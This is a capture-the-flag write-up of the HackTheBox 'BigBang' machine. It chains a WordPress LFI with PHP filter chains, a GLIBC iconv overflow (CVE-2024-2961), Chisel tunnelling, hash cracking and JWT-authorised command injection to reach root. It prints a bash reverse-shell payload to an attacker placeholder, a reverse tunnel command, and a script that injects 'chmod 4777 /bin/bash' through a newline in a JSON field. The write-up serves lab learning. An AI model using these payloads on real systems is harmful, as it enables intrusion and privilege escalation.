+++
date = '2026-06-17T18:35:55+02:00'
draft = false
title = 'BigBang Writeup EN'
+++
**Name:** **`joy.scd01`**

**Date:** **`01/02/2025`**

![BigBang.png](/images/imgs_bigbang/BigBang.jpeg)

---
# Introduction

_BigBang_ is the third seasonal machine released for **HTB Season 7**. Classified as a **Hard-level Linux** box, it presents a highly realistic and complex attack path.

The initial foothold required chaining an **LFI vulnerability** with **PHP filtering** to achieve **Remote Code Execution** via a **GLIBC ICONV buffer overflow**. From there, lateral movement involved discovering database credentials, tunneling the **MySQL service** with **Chisel**, and cracking a dumped hash. 

Finally, privilege escalation to root demanded **local port forwarding** to expose a hidden **Grafana** instance, cracking another database hash, and ultimately exploiting a vulnerable **API endpoint** via **JWT manipulation** and **command injection**.

---
# Techniques used
- **LFI chained with PHP Filter Conversions**

- **RCE via GLIBC ICONV Buffer Overflow (CVE-2024-2961)**

- **Port Forwarding & Tunneling (Chisel & SSH)**

- **Database Dumping & Offline Password Cracking (Hashcat/John)**

- **JWT Manipulation & Command Injection**

---
# Enumeration

## nmap

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV -T4 bigbang
```

![nmap.png](/images/imgs_bigbang/nmap.png)

**Found 2 open ports**:

- **22/tcp** -- ssh

- **80/tcp** -- http

Noticing the **HTTP service** redirected to a specific domain, I immediately added **`blog.bigbang.htb`** to my **`/etc/hosts`** file to ensure proper virtual host routing.

---
## Web Enumeration (gobuster & WPScan)

I began mapping the web application's structure using **gobuster**:

```bash
gobuster dir -u http://blog.bigbang.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

![gob.png](/images/imgs_bigbang/gob.png)

The scan revealed a standard **WordPress** login page and the **`xmlrpc.php`** endpoint. 

Knowing it was a **WordPress site**, I fired up **WPScan** to dig deeper into potential plugin vulnerabilities:

```bash
wpscan --url http://blog.bigbang.htb -e ap --api-token <API_TOKEN>
```

![wpscan.png](/images/imgs_bigbang/wpscan.png)

**WPScan** reported multiple vulnerabilities, including one in the **BuddyForms plugin**. I attempted to upload a malicious **PHP** file to get a quick shell, but the form strictly accepted only **images/GIFs**. 

I considered trying to embed malicious code directly into an image metadata, but since I hadn't practically exploited that specific technique before, I decided to enumerate further to see if there was a cleaner vector.

Running a second **gobuster** scan targeting the **wp-content** directory:

```bash
gobuster dir -u http://blog.bigbang.htb/wp-content/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

![gob2.png](/images/imgs_bigbang/gob2.png)

Inside the **`/uploads`** directory, I found **.png files** that appeared to contain **filtered data**. This was a massive red flag pointing toward a **Local File Inclusion (LFI)** vulnerability.

---
# Initial Access - LFI → PHP Filtering → RCE

After some research on how to exploit this specific filtering behavior, I discovered a relevant exploit path in this **GitHub** repo by **ambionics**:
- https://github.com/ambionics/cnext-exploits

With the help of an **AI**, I developed a script (**`lfi.py`**) that exploits the **LFI** by sending a **POST request** to **`admin-ajax.php`**. It abuses the url parameter by using a massive chain of **PHP filter conversions** to read and encode the specified file, ultimately outputting it as a **.png**.

Testing the script on **`/etc/passwd`** confirmed the vulnerability:

![lfi.png](/images/imgs_bigbang/lfi.png)

## Escalating LFI to RCE

While reading files is great, I needed **Remote Code Execution** for a foothold. I kept digging and found an excellent blog post detailing a **GLIBC ICONV buffer overflow** in **PHP** (**CVE-2024-2961**):

- https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html

I modified my initial script into **`bigbang_rce.py`** to read **`/proc/self/maps`**, extract the necessary **memory addresses**, and trigger the **overflow**.

**Note**: _The full **bigbang_rce.py** script is extensive, but the core logic relies on padding memory chunks and manipulating the **zend_mm_heap** structure to force the **execution of arbitrary commands**._

To execute it smoothly, I set up a dedicated **Python environment**:

```bash
sudo apt-get update
sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
pip install ten
```

Once the dependencies were resolved, I triggered the exploit to send a reverse shell back to my listener:

```bash
python3 bigbang_rce.py 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' 'bash -c "bash -i >& /dev/tcp/<attacker_ip>/<lport> 0>&1"'
```

![rce.png](/images/imgs_bigbang/rce.png)

Catching the shell on port 22667:

```bash
nc -lvnp 22667
```

![shell.png](/images/imgs_bigbang/shell.png)

I successfully gained initial access as the **www-data** user.

---
# Lateral Movement - DB Dump → Password Cracking

As **www-data**, my first move in any **WordPress environment** is to read the configuration file. Inside **`wp-config.php`**, I extracted the database credentials:

![dbconf.png](/images/imgs_bigbang/dbconf.png)

To interact comfortably with the database from my attacker machine, I needed to reach the **MySQL** service. To do so, I set up a port forwarding tunnel using **Chisel**.

**OPSEC Note**: _I found a **chisel** binary already sitting in the **`/tmp`** directory, likely left behind by another user. While it is fairly unlikely for such a tool to be intentionally backdoored by another player in an environment like **HackTheBox**, executing unknown third-party binaries in a real-world scenario (or a shared lab) represents a severe security risk. The absolute best practice is always to transfer a trusted binary from your own host._

```bash
# Attacker machine
chisel server -p 8000 --reverse

# Victim machine
./chisel client <attacker_IP>:8000 R:3306:172.17.0.1:3306
```

With the tunnel established, I connected to the **MySQL database**:

```bash
mysql -D 'wordpress' -u 'wp_user' -h 127.0.0.1 -P 3306 --skip-ssl -p --connect-timeout=5 -v
```

![database.png](/images/imgs_bigbang/database.png)

Dumping the database revealed a hash for the user **shawking**. I saved it locally and fired up **John The Ripper**:

```bash
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![hash.png](/images/imgs_bigbang/hash.png)

I logged in via **SSH** and retrieved the **user flag**:

![userF.png](/images/imgs_bigbang/userF.png)

---
# Privilege Escalation – Tunneling → JWT Injection → Root

Once logged in as **shawking**, I uploaded and ran **`linpeas.sh`** to hunt for **privilege escalation vectors**. The output highlighted several critical pieces of information:

- An internal service running on **127.0.0.1:9090**.

- An additional user named **developer**.

- A **`/.htpasswd`** file containing hashes.

- Another **SQLite database** belonging to **Grafana**.

![grafagna.png](/images/imgs_bigbang/grafagna.png)

## Exploiting Port 9090 & Grafana

To investigate the service on **port 9090**, I set up an **SSH local port forward**:

```bash
ssh -L 9090:127.0.0.1:9090 shawking@bigbang.htb
```

Simultaneously, I extracted the hash from **`grafana.db`** and cracked it using **Hashcat**, yielding the password: **bigbang**.

I tried a quick **POST request** to **bruteforce** the **`/login`** endpoint on the forwarded port using the discovered credentials:

```bash
curl -X POST -v 127.0.0.1:9090/login \
-H "Content-Type: application/json" \
-d '{"username":"developer","password":"bigbang"}'
```

This successfully returned a **JWT Token**.

![jwt.png](/images/imgs_bigbang/jwt.png)

Using the cracked password, I was also able to **SSH** directly into the machine as **developer**. However, almost every command returned a **"Permission Denied"** error. My access was heavily restricted.

## Command Injection via JWT

I had a **JWT token** and a restricted shell. I researched the specific application version and found that its **`/command`** API endpoint was vulnerable to **command injection** through the **output_file** parameter by abusing the new-line character (**\n**).

I wrote a quick Python script to automate the injection using the obtained **JWT token** for authorization:

```python
import requests

url = "http://127.0.0.1:9090/command"

headers = {
    "Host": "127.0.0.1:9090",
    "User-Agent": "curl/8.10.1",
    "Accept": "*/*",
    "Content-Type": "application/json",
    "Authorization": "Bearer <INSERT_JWT_TOKEN_HERE>"
}

payload = {
    "command": "send_image",
    "output_file": "foo \n chmod 4777 /bin/bash"
}

response = requests.post(url, headers=headers, json=payload)

print("Status Code:", response.status_code)
print("Response Body:", response.text)
```

By executing **`chmod 4777 /bin/bash`**, I successfully assigned the **SUID bit** to the **bash** binary.

Back in my **SSH** session, I spawned a privileged shell:

```bash
/bin/bash -p
```

![root.png](/images/imgs_bigbang/root.png)

**System rooted**.

---
# Final Thoughts

**BigBang** holds a special milestone for me, as it marks my very first solo completion of a **Hard-level** active machine on **HackTheBox**.

The box is a brilliant example of chaining multiple web vulnerabilities into a cohesive attack path. The transition from a seemingly simple LFI to exploiting a GLIBC buffer overflow via PHP filter chains is a highly technical vector. Beyond the pure exploitation phase, this machine was incredibly useful for getting my hands dirty with **Python scripting**. Adapting, debugging, and understanding the custom scripts for the LFI and the buffer overflow—even with the assistance of an AI—provided a massive learning opportunity and pushed my custom tooling skills forward.

Moving laterally was linear but required a methodical approach to port forwarding, emphasizing the importance of tools like **Chisel**. Finally, the privilege escalation beautifully demonstrated the dangers of insecure API endpoints and improper input sanitization in internal tools. 

Overall, an intense and highly rewarding machine that tests both advanced web exploitation, custom scripting, and internal pivoting skills.

**Sources**:

- **CNEXT Exploits (LFI)**: https://github.com/ambionics/cnext-exploits

- **GLIBC ICONV Buffer Overflow (CVE-2024-2961)**: https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html
